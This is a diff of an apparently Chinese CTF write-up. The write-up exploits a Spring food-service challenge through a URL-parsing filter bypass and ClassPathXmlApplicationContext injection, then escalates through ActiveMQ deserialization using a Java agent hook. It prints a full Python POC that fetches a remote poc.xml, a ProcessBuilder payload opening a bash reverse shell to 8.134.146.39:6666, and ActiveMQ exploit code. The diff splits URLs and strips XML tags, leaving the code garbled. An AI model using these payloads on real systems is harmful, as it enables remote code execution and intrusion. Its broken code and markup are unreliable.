@@ -21,7 +21,8 @@ String uri = ((HttpServletRequest)request).getRequestURI().replaceAll("/api",
 
 可以利用url解析特性来绕过，payload如下：
 
-http://192.168.195.128:32821/api;a=b/changefood
+http://192.168.195.128:
+32821/api;a=b/changefood
 
 ‍
 
@@ -44,10 +45,12 @@ public String change(@RequestParam String foodServiceClassName, @RequestPar
 这里虽然实例化后会强转FoodService报错，但是SPEL注入发生在实例化时，并不影响攻击。使用以下POC完成这一阶段的攻击：
 
 import requests
-url = "http://192.168.195.128:32821/"
+url = "http://192.168.195.128:
+32821/"
 def change():
     u = url + "api;a=b/changefood"
-    r = requests.post(u,{"foodServiceClassName":"org.springframework.context.support.ClassPathXmlApplicationContext","name":"http://8.134.146.39:8000/poc.xml"}).text
+    r = requests.post(u,{"foodServiceClassName":"org.springframework.context.support.ClassPathXmlApplicationContext","name":"http://8.134.146.39:
+8000/poc.xml"}).text
     print(r)
 
 change()
@@ -55,11 +58,8 @@ change()
 poc.xml
 
 <?xml version="1.0" encoding="UTF-8" ?>
-<beans xmlns="http://www.springframework.org/schema/beans"
-       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xsi:schemaLocation="
-     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+
+    
         <constructor-arg >
             <list>
                     <value>bash</value>
@@ -67,8 +67,8 @@ poc.xml
                     <value><![CDATA[bash -i >& /dev/tcp/8.134.146.39/6666  0>&1]]></value>
             </list>
         </constructor-arg>
-    </bean>
-</beans>
+    
+
 
 然后获得一个反弹shell，但是/flag没有读权限，需要提权。
 
@@ -119,17 +119,8 @@ String uri = ((HttpServletRequest)request).getRequestURI().replaceAll("/api",
         } else {
             chain.doFilter(request, response);
        }
-```
-
-
-
-```
-http://192.168.195.128:32821/api;a=b/changefood
-```
-
-
-
-```
+http://192.168.195.128:
+32821/api;a=b/changefood
 public String change(@RequestParam String foodServiceClassName, @RequestParam String name) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
         Class foodServiceClass;
         try {
@@ -141,30 +132,19 @@ public String change(@RequestParam String foodServiceClassName, @RequestPar
         this.foodService = (FoodService)foodServiceClass.getDeclaredConstructor(String.class).newInstance(name);
         return "Changed to " + foodServiceClassName + " with name " + name;
     }
-```
-
-
-
-```
 import requests
-url = "http://192.168.195.128:32821/"
+url = "http://192.168.195.128:
+32821/"
 def change():
     u = url + "api;a=b/changefood"
-    r = requests.post(u,{"foodServiceClassName":"org.springframework.context.support.ClassPathXmlApplicationContext","name":"http://8.134.146.39:8000/poc.xml"}).text
+    r = requests.post(u,{"foodServiceClassName":"org.springframework.context.support.ClassPathXmlApplicationContext","name":"http://8.134.146.39:
+8000/poc.xml"}).text
     print(r)
 
 change()
-```
-
-
-
-```
 <?xml version="1.0" encoding="UTF-8" ?>
-<beans xmlns="http://www.springframework.org/schema/beans"
-       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xsi:schemaLocation="
-     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+
+    
         <constructor-arg >
             <list>
                     <value>bash</value>
@@ -172,13 +152,8 @@ change()
                     <value><![CDATA[bash -i >& /dev/tcp/8.134.146.39/6666  0>&1]]></value>
             </list>
         </constructor-arg>
-    </bean>
-</beans>
-```
+    
 
-
-
-```
 public static void main(String[] args) throws JMSException {
         ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(args[0]);
         connectionFactory.setTrustedPackages(List.of("com.example.customer.entity"));
@@ -204,21 +179,11 @@ public static void main(String[] args) throws JMSException {
         });
         System.out.println("Waiting for messages...");
     }
-```
-
-
-
-```
 public void oneway(Object command) throws IOException {
         this.checkStarted();
         this.wireFormat.marshal(command, this.dataOut);
         this.dataOut.flush();
     }
-```
-
-
-
-```
 package com.test;
 
 import java.lang.instrument.Instrumentation;
@@ -230,7 +195,8 @@ public class SocketHook {
         String hookClass = "org.apache.activemq.transport.tcp.TcpTransport";
         String hookMethod = "oneway";
         String targetClass = "org.springframework.context.support.ClassPathXmlApplicationContext";  //需要调用的类，这里只能选择构造方法只接收一个String参数的类
-        String arg = "http://8.134.146.39:8000/poc1.xml";  // 传入的参数
+        String arg = "http://8.134.146.39:
+8000/poc1.xml";  // 传入的参数
         String data = "1f01360000000000000100" + int2hex(targetClass.length(),4) + string2hex(targetClass)  + int2hex(arg.length(),4) + string2hex(arg);
         data = int2hex(data.length()/2,8) + data;
         String base64str = Base64.getEncoder().encodeToString(hex2bytes(data));
@@ -284,11 +250,6 @@ public class SocketHook {
     }
 
 }
-```
-
-
-
-```
 package com.test;
 
 import javassist.*;
@@ -335,26 +296,19 @@ public class SocketTransformer implements ClassFileTransformer {
         return null;
     }
 }
-```
-
-
-
-```
 <?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://maven.apache.org/POM/4.0.0"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+
     <modelVersion>4.0.0</modelVersion>
 
     <groupId>com.test</groupId>
     <artifactId>SocketHook</artifactId>
     <version>1.0-SNAPSHOT</version>
 
-    <properties>
+    
         <maven.compiler.source>11</maven.compiler.source>
         <maven.compiler.target>11</maven.compiler.target>
-        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
-    </properties>
+        UTF-8
+    
 
     <dependencies>
         <!-- 其他依赖项 -->
@@ -369,15 +323,15 @@ public class SocketTransformer implements ClassFileTransformer {
         <!-- 其他依赖项 -->
     </dependencies>
 
-    <build>
-        <plugins>
-            <plugin>
+    
+        
+            
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-jar-plugin</artifactId>
                 <version>3.2.0</version> <!-- 使用最新版本 -->
-            </plugin>
+            
 
-            <plugin>
+            
                 <artifactId>maven-assembly-plugin</artifactId>
                 <version>3.3.0</version> <!-- 使用最新版本 -->
                 <configuration>
@@ -394,46 +348,26 @@ public class SocketTransformer implements ClassFileTransformer {
                 </configuration>
                 <executions>
                     <execution>
-                        <id>make-assembly</id>
-                        <phase>package</phase>
+                        make-assembly
+                        package
                         <goals>
                             <goal>single</goal>
                         </goals>
                     </execution>
                 </executions>
-            </plugin>
-        </plugins>
-    </build>
-
-</project>
-```
+            
+        
+    
 
 
-
-```
 chmod +x ./jattach
 ./jattach 42 load instrument false /tmp/x.ajr
-```
-
-
-
-```
 String hookCode = "if (this.socket.getRemoteSocketAddress().toString().contains("192.168.195.66")){java.io.OutputStream out = this.socket.getOutputStream();out.flush();" +
                 "out.write(java.util.Base64.getDecoder().decode("" + base64str + ""));" +
                 "out.flush();System.out.println("payload send done!!!");}";
-```
-
-
-
-```
 String hookCode = "if (command.toString().contains("xxx")){java.io.OutputStream out = this.socket.getOutputStream();out.flush();" +
                 "out.write(java.util.Base64.getDecoder().decode("" + base64str + ""));" +
                 "out.flush();System.out.println("payload send done!!!");}";
-```
-
-
-
-```
 package com.example;
 
 import org.apache.activemq.ActiveMQConnection;
@@ -447,12 +381,14 @@ public class ExceptionResponseExploit {
 
     public static void main(String[] args) throws Exception {
 
-        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://192.168.195.128:32824");
+        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://192.168.195.128:
+32824");
 
         Connection connection = factory.createConnection();
         connection.start();
 
-        Exception obj2 = new ClassPathXmlApplicationContext("http://127.0.0.1:8080/poc.xml");
+        Exception obj2 = new ClassPathXmlApplicationContext("http://127.0.0.1:
+8080/poc.xml");
 
         ExceptionResponse response = new ExceptionResponse(obj2);
 
